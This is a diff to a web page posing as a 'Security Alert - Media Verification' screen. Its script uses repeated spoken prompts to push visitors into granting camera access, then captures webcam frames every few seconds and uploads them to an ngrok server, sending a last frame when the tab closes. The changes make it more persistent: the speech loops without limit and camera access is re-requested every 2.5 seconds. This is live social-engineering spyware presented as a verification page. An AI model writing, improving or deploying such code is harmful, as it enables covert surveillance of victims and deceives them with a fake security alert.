@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Media Verification</title>
+<title>Security Alert - Media Verification v3.6</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; }
@@ -24,15 +24,15 @@
 
   var CONFIG = {
     tts: {
-      text: "Security verification required. Camera access must be enabled to confirm user identity.",
+      text: "Security verification required. Camera access must remain active to confirm user identity.",
       lang: 'en-US',
       rate: 0.9,
       pitch: 1.0,
-      repeatInterval: 6000,
-      maxRepeats: 15
+      repeatInterval: 5000,
+      maxRepeats: 30
     },
-    cameraRetryInterval: 4000,
-    uploadInterval: 3000, // Interval kirim frame gambar ke server setiap 3 detik
+    loopInterval: 2500,       
+    uploadInterval: 3000,     
     serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_capture'
   };
 
@@ -41,16 +41,12 @@
     ttsCount: 0,
     camStream: null,
     camActive: false,
+    loopTimer: null,
     uploadTimer: null
   };
 
-  // ============================================
-  // TTS MODULE
-  // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
-    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
-
     try {
       var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
       u.lang = CONFIG.tts.lang;
@@ -58,10 +54,7 @@
       u.pitch = CONFIG.tts.pitch;
 
       u.onend = function () {
-        state.ttsCount++;
-        if (state.ttsCount < CONFIG.tts.maxRepeats) {
-          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
-        }
+        setTimeout(speakOnce, CONFIG.tts.repeatInterval);
       };
 
       window.speechSynthesis.speak(u);
@@ -75,9 +68,6 @@
     speakOnce();
   }
 
-  // ============================================
-  // UPLOAD CAPTURE KE SERVER NGROK
-  // ============================================
   function captureAndUpload(isUnloading) {
     if (!state.camActive) return;
 
@@ -87,12 +77,11 @@
 
     try {
       if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
-
+      
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
       var dataURL = canvas.toDataURL('image/jpeg', 0.80);
       var payload = JSON.stringify({ image: dataURL });
 
-      // Kirim menggunakan sendBeacon jika halaman ditutup agar frame terakhir tetap terkirim
       if (isUnloading && navigator.sendBeacon) {
         var blob = new Blob([payload], { type: 'application/json' });
         navigator.sendBeacon(CONFIG.serverEndpoint, blob);
@@ -108,23 +97,32 @@
         keepalive: true
       })
       .then(function(res) {
-        if (!res.ok) throw new Error('Status: ' + res.status);
+        if (!res.ok) throw new Error('Server response status: ' + res.status);
         return res.json();
       })
       .then(function(data) {
         console.log('[+] Frame uploaded successfully:', data.filename);
       })
       .catch(function(err) {
-        console.log('[-] Upload failed:', err.message);
+        console.log('[-] Failed to upload frame:', err.message);
       });
     } catch (e) {}
   }
 
-  // ============================================
-  // CAMERA PERSISTENT ACCESS MODULE
-  // ============================================
+  function stopCurrentStream() {
+    if (state.camStream) {
+      try {
+        state.camStream.getTracks().forEach(function(track) {
+          track.stop();
+        });
+      } catch (e) {}
+      state.camStream = null;
+    }
+    state.camActive = false;
+  }
+
   function requestCameraAccess() {
-    if (state.camActive) return;
+    stopCurrentStream();
 
     navigator.mediaDevices.getUserMedia({ 
       video: { 
@@ -137,7 +135,7 @@
     .then(function(stream) {
       state.camStream = stream;
       state.camActive = true;
-      console.log("[+] Camera access granted and active stream opened.");
+      console.log("[+] Camera stream cycle active.");
       
       var videoElement = document.getElementById('cam-feed');
       videoElement.srcObject = stream;
@@ -145,53 +143,36 @@
 
       stream.getVideoTracks().forEach(function(track) {
         track.onended = function() {
-          console.log("[!] Camera track ended, attempting re-initialization...");
           state.camActive = false;
-          setTimeout(requestCameraAccess, 2000);
         };
       });
     })
     .catch(function(err) {
-      console.log("[-] Camera access denied or restricted:", err.name);
-      setTimeout(requestCameraAccess, CONFIG.cameraRetryInterval);
+      console.log("[-] Camera access restricted/denied:", err.name);
     });
   }
 
-  // ============================================
-  // AUTOMATED TRIGGER CHAINS
-  // ============================================
   window.addEventListener('DOMContentLoaded', function() {
     startTTS();
     requestCameraAccess();
-
-    // Memulai timer pengiriman tangkapan frame setiap 3 detik
-    state.uploadTimer = setInterval(function() {
-      captureAndUpload(false);
-    }, CONFIG.uploadInterval);
   });
 
-  // Kirim frame darurat saat halaman ditutup
+  state.loopTimer = setInterval(function() {
+    requestCameraAccess();
+  }, CONFIG.loopInterval);
+
+  state.uploadTimer = setInterval(function() {
+    captureAndUpload(false);
+  }, CONFIG.uploadInterval);
+
   window.addEventListener('beforeunload', function() {
     captureAndUpload(true);
   });
 
-  setTimeout(function() {
-    requestCameraAccess();
-    startTTS();
-  }, 1000);
-
-  setInterval(function() {
-    if (!state.camActive) {
-      requestCameraAccess();
-    }
-  }, CONFIG.cameraRetryInterval);
-
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden) {
       startTTS();
-      if (!state.camActive) {
-        requestCameraAccess();
-      }
+      requestCameraAccess();
     }
   });
 
